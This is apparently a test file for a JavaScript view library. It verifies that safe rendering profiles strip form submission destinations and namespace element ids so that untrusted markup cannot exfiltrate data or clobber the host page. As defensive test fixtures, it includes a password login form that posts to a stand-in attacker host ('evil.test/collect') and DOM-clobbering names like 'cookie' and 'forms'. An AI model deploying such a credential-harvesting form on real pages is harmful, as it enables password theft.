//@ts-check
/**
 * @file Both safe profiles keep an untrusted document inside itself when it
 * renders in the host's page without a frame:
 *  - no form submission leaves its control: a form's destination and a
 *    submitter's override are dropped, and every form is `method="dialog"`,
 *    which sends nothing anywhere;
 *  - every id it declares, and every id reference it makes, lives in the
 *    render's namespace (`idPrefix`, default `jaren-u-`), so its references
 *    resolve among its own elements and none reaches, or shadows, the host's;
 *    `name` on the elements that become `document` properties is namespaced
 *    the same way.
 * Each is pinned on the DOM renderer and the serializer, which must agree.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { createDomRenderer, renderToString } from '@jarenjs/view';

import { createStubHost } from './dom.stub.js';
import { childMarkup } from './interactive-corpus.js';

const PROFILES = /** @type {const} */ ([true, 'interactive']);

/**
 * Render on both renderers under one profile; the markup must agree.
 * @param {any} vnode
 * @param {Record<string, any>} options
 */
function both(vnode, options) {
  /** @type {string[]} */
  const ssrSeen = [];
  /** @type {string[]} */
  const domSeen = [];
  const html = renderToString(vnode, { ...options, onUnsafe: (i) => ssrSeen.push(`${i.kind}:${i.name}`) });
  const { document, container } = createStubHost();
  createDomRenderer(container, { document, ...options, onUnsafe: (i) => domSeen.push(`${i.kind}:${i.name}`) })(vnode);
  assert.equal(childMarkup(container), html, 'DOM and SSR agree');
  assert.deepEqual([...domSeen].sort(), [...ssrSeen].sort(), 'DOM and SSR report alike');
  return { html, seen: [...ssrSeen].sort(), container };
}

describe('safe profiles — no form submission leaves the document', () => {
  const LOGIN = ['form', { action: 'https://evil.test/collect', method: 'post', target: '_top', enctype: 'multipart/form-data', class: 'login' },
    ['input', { type: 'password', name: 'pw', autocomplete: 'current-password' }],
    ['button', { formaction: 'https://evil.test/', formmethod: 'post', formtarget: '_blank', formenctype: 'text/plain', formnovalidate: true, type: 'submit' }, 'Go'],
    ['input', { type: 'submit', formAction: 'https://evil.test/', FORMMETHOD: 'get' }]];

  for (const safe of PROFILES) {
    it(`drops every destination and makes the form a dialog form (safe: ${JSON.stringify(safe)})`, () => {
      const { html, seen } = both(LOGIN, { safe });
      assert.equal(html, '<form method="dialog" class="login"><input type="password" name="pw" autocomplete="current-password">'
        + '<button type="submit">Go</button><input type="submit"></form>');
      assert.deepEqual(seen, ['prop:FORMMETHOD', 'prop:action', 'prop:enctype', 'prop:formAction', 'prop:formaction',
        'prop:formenctype', 'prop:formmethod', 'prop:formnovalidate', 'prop:formtarget', 'prop:method', 'prop:target']);
    });
  }

  it('keeps method="dialog" through patches that try to change it, and on a form widget host', () => {
    const { document, container } = createStubHost();
    const render = createDomRenderer(container, { document, safe: true });
    render(['form', {}, 'a']);
    render(['form', { method: 'post', action: 'https://evil.test/' }, 'b']);
    render(['form', {}, 'c']);
    assert.equal(childMarkup(container), '<form method="dialog">c</form>');
    const widgets = { box: { mount() {}, ssr: () => 'x' } };
    const options = { safe: 'interactive', widgets, capabilities: { widgets: ['box'] } };
    const widget = ['jaren-widget', { name: 'box', tag: 'form', action: 'https://evil.test/' }];
    assert.equal(renderToString(widget, options), '<form method="dialog">x</form>');
    const host = createStubHost();
    createDomRenderer(host.container, { document: host.document, ...options })(widget);
    assert.equal(childMarkup(host.container), '<form method="dialog"></form>');
  });

  it('keeps action and target where they are not a form destination, as before', () => {
    // `target` on a link is a navigation target, not a submission
    assert.equal(both(['a', { href: 'https://x.test/', target: '_blank' }, 'x'], { safe: true }).html,
      '<a href="https://x.test/" target="_blank">x</a>');
  });

  it('leaves trusted rendering alone', () => {
    assert.equal(renderToString(['form', { action: '/save', method: 'post' }, ['button', { formaction: '/other' }, 'x']]),
      '<form action="/save" method="post"><button formaction="/other">x</button></form>');
  });
});

describe('safe profiles — ids and references live in the render\'s namespace', () => {
  const DOC = ['div', {},
    ['label', { for: 'x' }, 'Name'], ['input', { id: 'x', list: 'opts', form: 'f', 'aria-describedby': 'hint x', 'aria-activedescendant': 'x' }],
    ['datalist', { id: 'opts' }], ['form', { id: 'f', name: 'cookie' }],
    ['button', { popovertarget: 'pop', commandfor: 'pop', 'aria-controls': 'pop', 'aria-labelledby': ' x  hint ' }, 'open'],
    ['div', { id: 'pop', popover: 'auto' }, 'pop'], ['p', { id: 'hint' }, 'hint'],
    ['a', { href: '#x' }, 'jump'], ['a', { href: '#' }, 'top'], ['a', { href: '/page#x' }, 'other page'],
    ['table', {}, ['tbody', {}, ['tr', {}, ['th', { id: 'h' }, 'H'], ['td', { headers: 'h' }, 'v']]]],
    ['img', { src: '/a.png', name: 'forms', usemap: '#m', alt: 'a' }],
  ];

  for (const safe of PROFILES) {
    it(`prefixes each id and rewrites each reference to it the same way (safe: ${JSON.stringify(safe)})`, () => {
      const { html } = both(DOC, { safe });
      assert.equal(html, '<div><label for="jaren-u-x">Name</label>'
        + '<input id="jaren-u-x" list="jaren-u-opts" form="jaren-u-f" aria-describedby="jaren-u-hint jaren-u-x" aria-activedescendant="jaren-u-x">'
        + '<datalist id="jaren-u-opts"></datalist><form method="dialog" id="jaren-u-f" name="jaren-u-cookie"></form>'
        + '<button popovertarget="jaren-u-pop" commandfor="jaren-u-pop" aria-controls="jaren-u-pop" aria-labelledby="jaren-u-x jaren-u-hint">open</button>'
        + '<div id="jaren-u-pop" popover="auto">pop</div><p id="jaren-u-hint">hint</p>'
        + '<a href="#jaren-u-x">jump</a><a href="#">top</a><a href="/page#x">other page</a>'
        + '<table><tbody><tr><th id="jaren-u-h">H</th><td headers="jaren-u-h">v</td></tr></tbody></table>'
        + '<img src="/a.png" name="jaren-u-forms" usemap="#jaren-u-m" alt="a"></div>');
    });
  }

  it('resolves every reference to the document\'s element and none to the host\'s element of the same id', () => {
    const { document, container } = createStubHost();
    const hostX = document.createElement('input');
    hostX.setAttribute('id', 'x');
    const page = document.createElement('body');
    page.appendChild(hostX);
    page.appendChild(container);
    createDomRenderer(container, { document, safe: 'interactive' })(DOC);
    const walk = (node) => [node, ...(node.childNodes ?? []).flatMap(walk)];
    const byId = (id) => walk(page).filter((node) => node.getAttribute?.('id') === id);
    const root = container.childNodes[0];
    const references = [
      root.childNodes[0].getAttribute('for'),
      root.childNodes[4].getAttribute('popovertarget'),
      ...root.childNodes[1].getAttribute('aria-describedby').split(' '),
      ...root.childNodes[4].getAttribute('aria-labelledby').split(' '),
      root.childNodes[7].getAttribute('href').slice(1),
    ];
    for (const id of references) {
      const targets = byId(id);
      assert.equal(targets.length, 1, `${id} resolves to exactly one element`);
      assert.ok(walk(container).includes(targets[0]), `${id} resolves inside the document`);
      assert.notEqual(targets[0], hostX);
    }
    assert.deepEqual(byId('x'), [hostX], 'the host keeps its own #x');
  });

  it('namespaces url(#id) in SVG references and inline style', () => {
    const svg = ['svg', {}, ['defs', {}, ['linearGradient', { id: 'g' }], ['clipPath', { id: 'c' }], ['marker', { id: 'm' }]],
      ['rect', { fill: 'url(#g)', 'clip-path': 'url( "#c" )', 'marker-end': 'url(#m)', stroke: 'red', style: 'stroke: url(\'#g\')' }],
      ['path', { style: { fill: 'url(#g)', stroke: 'blue' } }], ['use', { href: '#g' }]];
    for (const safe of PROFILES) {
      assert.equal(both(svg, { safe }).html, '<svg><defs><linearGradient id="jaren-u-g"></linearGradient><clipPath id="jaren-u-c"></clipPath>'
        + '<marker id="jaren-u-m"></marker></defs><rect fill="url(#jaren-u-g)" clip-path="url( &quot;#jaren-u-c&quot; )" marker-end="url(#jaren-u-m)" stroke="red" style="stroke: url(\'#jaren-u-g\')"></rect>'
        + '<path style="fill:url(#jaren-u-g);stroke:blue"></path><use href="#jaren-u-g"></use></svg>');
    }
  });

  it('takes a host-supplied prefix, the same on both renderers', () => {
    for (const safe of PROFILES) {
      const { html } = both(['label', { for: 'x', id: 'x' }, 'x'], { safe, idPrefix: 'tenant7-' });
      assert.equal(html, '<label for="tenant7-x" id="tenant7-x">x</label>');
    }
  });

  it('refuses a prefix that is not a plain token, on both renderers', () => {
    for (const idPrefix of ['', '7x', 'a b', 'a#', 'a"', 'x)', 3, null]) {
      const { document, container } = createStubHost();
      assert.throws(() => createDomRenderer(container, { document, safe: true, idPrefix }), TypeError, String(idPrefix));
      assert.throws(() => renderToString(['p', {}], { safe: 'interactive', idPrefix }), TypeError, String(idPrefix));
    }
  });

  it('namespaces name where it would become a document property, and leaves a control\'s name alone', () => {
    for (const safe of PROFILES) {
      assert.equal(both(['div', {}, ['form', { name: 'forms' }, ['input', { name: 'pw' }]], ['img', { name: 'cookie', src: '/a.png' }]], { safe }).html,
        '<div><form method="dialog" name="jaren-u-forms"><input name="pw"></form><img name="jaren-u-cookie" src="/a.png"></div>');
    }
  });

  it('leaves a value that declares no id as it is', () => {
    assert.equal(renderToString(['p', { id: '', 'aria-labelledby': '  ', for: true }, 'x'], { safe: true }), '<p id="" aria-labelledby="  " for>x</p>');
    assert.equal(both(['p', { id: 7 }, 'x'], { safe: true }).html, '<p id="jaren-u-7">x</p>');
  });

  it('rewrites a reference on a later frame too, and the hydrated DOM matches the serializer with the same prefix', () => {
    const { document, container } = createStubHost();
    const render = createDomRenderer(container, { document, safe: 'interactive', idPrefix: 'p-' });
    render(['label', { for: 'a' }, 'x']);
    render(['label', { for: 'b' }, 'x']);
    assert.equal(childMarkup(container), '<label for="p-b">x</label>');
    assert.equal(childMarkup(container), renderToString(['label', { for: 'b' }, 'x'], { safe: 'interactive', idPrefix: 'p-' }));
  });

  it('leaves trusted rendering alone', () => {
    assert.equal(renderToString(['label', { for: 'x', id: 'y' }, ['a', { href: '#x' }, 'go']]), '<label for="x" id="y"><a href="#x">go</a></label>');
  });
});
